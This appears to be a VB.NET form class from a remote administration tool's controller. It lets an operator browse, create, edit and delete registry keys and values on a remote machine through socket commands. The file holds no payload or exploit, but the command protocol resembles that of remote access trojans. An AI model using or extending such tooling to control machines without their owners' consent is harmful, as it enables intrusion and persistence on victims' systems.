Imports System.Runtime.CompilerServices

Public Class Reg
    Public sock As Integer
    Public CN As Boolean
    Private Sub CreateKeyToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CreateKeyToolStripMenuItem.Click
        If ((Not RGk.SelectedNode Is Nothing) AndAlso RGk.SelectedNode.FullPath.Contains("\")) Then
            Dim str As String = Interaction.InputBox("Key Name?", "Create New Key", "Name", -1, -1)
            If (str.Length <> 0) Then
                Form1.S.Send(sock, "RG" & "|U|" & "#" & "|U|" & RGk.SelectedNode.FullPath & "\" & "|U|" & str)
            End If
        End If
    End Sub
    Private Sub DeleteKeyToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteKeyToolStripMenuItem.Click
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Dim fullPath As String = Me.RGk.SelectedNode.FullPath
            If fullPath.Contains("\") Then
                Dim str2 As String = Strings.Split(fullPath, "\", -1, CompareMethod.Binary)((Strings.Split(fullPath, "\", -1, CompareMethod.Binary).Length - 1))
                Dim str3 As String = ""
                Dim num2 As Integer = (Strings.Split(fullPath, "\", -1, CompareMethod.Binary).Length - 2)
                Dim i As Integer = 0
                Do While (i <= num2)
                    str3 = (str3 & Strings.Split(fullPath, "\", -1, CompareMethod.Binary)(i) & "\")
                    i += 1
                Loop
                Form1.S.Send(sock, "RG" & "|U|" & "$" & "|U|" & str3 & "|U|" & str2)
                Me.RGk.SelectedNode.Remove()
            End If
        End If
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.RGLIST.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Form1.S.Send(sock, "RG" & "|U|" & "@5" & "|U|" & RGk.SelectedNode.FullPath & "\" & "|U|" & current.Text)
            Loop
        Finally

        End Try
    End Sub

    Private Sub EditToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EditToolStripMenuItem.Click
        RGLIST_DoubleClick(RuntimeHelpers.GetObjectValue(sender), e)
    End Sub

    Private Sub NewValueToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NewValueToolStripMenuItem.Click
        Dim gv As New Rgv
        gv.Path = RGk.SelectedNode.FullPath & "\"
        gv.sock = Me.sock
        gv.TextBox1.Text = "Name"
        gv.ComboBox1.SelectedIndex = gv.ComboBox1.Items.IndexOf("String")
        gv.TextBox3.Text = "Value"
        gv.Text = gv.Path
        gv.ShowDialog(Me)
    End Sub

    Private Sub RefreshToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RefreshToolStripMenuItem1.Click
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Form1.S.Send(sock, "RG" & "|U|" & "~" & "|U|" & RGk.SelectedNode.FullPath & "\")
            Me.RGLIST.Enabled = False
            Me.RGk.Enabled = False
        End If
    End Sub
    Private Sub RGk_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles RGk.DoubleClick
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Form1.S.Send(sock, "RG" & "|U|" & "~" & "|U|" & RGk.SelectedNode.FullPath & "\" & "|U|")
            Me.RGLIST.Enabled = False
            '     Me.RGk.Enabled = False
        End If
    End Sub

    Private Sub RGLIST_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles RGLIST.DoubleClick
        If (Me.RGLIST.SelectedItems.Count <> 0) Then
            Dim item As ListViewItem = Me.RGLIST.SelectedItems.Item(0)
            Dim gv As New Rgv
            gv.Path = (Me.RGk.SelectedNode.FullPath & "\")
            gv.sock = Me.sock
            gv.TextBox1.Text = item.Text
            gv.ComboBox1.SelectedIndex = gv.ComboBox1.Items.IndexOf(item.SubItems.Item(1).Text)
            Try
                gv.TextBox3.Text = item.SubItems.Item(2).Text
            Catch exception1 As Exception
                Dim exception As Exception = exception1
            End Try
            gv.Text = gv.Path
            gv.TextBox1.ReadOnly = True
            gv.ShowDialog(Me)
        End If
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshToolStripMenuItem.Click
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Form1.S.Send(sock, "RG" & "|U|" & "~" & "|U|" & RGk.SelectedNode.FullPath & "\")
            Me.RGLIST.Enabled = False
            Me.RGk.Enabled = False
        End If
    End Sub

    Private Sub Reg_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub RGk_AfterSelect(sender As System.Object, e As System.Windows.Forms.TreeViewEventArgs) Handles RGk.AfterSelect

    End Sub
End Class